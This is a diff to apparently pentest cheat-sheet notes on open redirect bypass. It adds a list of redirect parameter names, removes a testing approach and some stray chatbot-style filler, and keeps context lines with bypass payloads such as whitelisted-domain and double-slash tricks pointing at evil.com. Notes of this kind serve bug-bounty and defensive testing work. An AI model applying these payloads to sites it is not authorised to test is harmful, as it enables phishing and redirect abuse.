@@ -937,23 +937,21 @@ uri,path,continue,url,window,to,out,view,dir,show,navigation,Open,url,file,val,v
 ?checkout_url={payload}
 ?continue={payload}
 ?return_path={payload}
+redirect=
+url=
+next=
+return=
+returnUrl=
+continue=
+dest=
+destination=
+go=
+out=
+to=
+view=
+forward=
+callback=
 ```
-
-### Approach:
-1. **URL Redirection on Path Fragments:**
-   ```
-   example: any.com/payloads
-   any.com/bing.com
-   any.com//bing.com
-   any.com//bing.com/%2e%2e
-   ```
-   Use the payload to attempt a brute-force attack.
-
-2. **Sort the Parameters Returning a 200 Response:**
-   ```
-   GET /url=https://bing.com/
-   ```
-
 ### Bypassing Techniques:
 - Using a whitelisted domain or keyword: `https://www.whitelisted.com/evil.com` redirects to `evil.com`
 - Using `//` to bypass `http` blacklisted keyword: `//google.com`
@@ -970,45 +968,7 @@ Below is a **complete, practical checklist of URL Redirection (Open Redirect) by
 This is written from a **pentester’s perspective** and aligned with real-world bug bounty / VAPT scenarios.
 
 ---
-
-# 🔴 URL Redirection (Open Redirect) – Bypass Techniques
-
-## 1️⃣ Basic Open Redirect Parameters
-
-First identify redirect parameters:
-
-```text
-redirect=
-url=
-next=
-return=
-returnUrl=
-continue=
-dest=
-destination=
-go=
-out=
-to=
-view=
-forward=
-callback=
-```
-
-**Test:**
-
-```text
-https://target.com/login?next=https://evil.com
-```
-
----
-Perfect 👍
-Below is **Open Redirection Bypass Techniques** written in the **same structured, numbered, payload-focused format** you shared (headers + payload blocks), suitable for **VAPT reports, GitHub notes, and bug bounty write-ups**.
-
----
-
 # 🔴 Open Redirection – Complete Bypass Techniques (Pentest Format)
-
----
 
 ## 📌 1. Basic Open Redirect Payloads
 
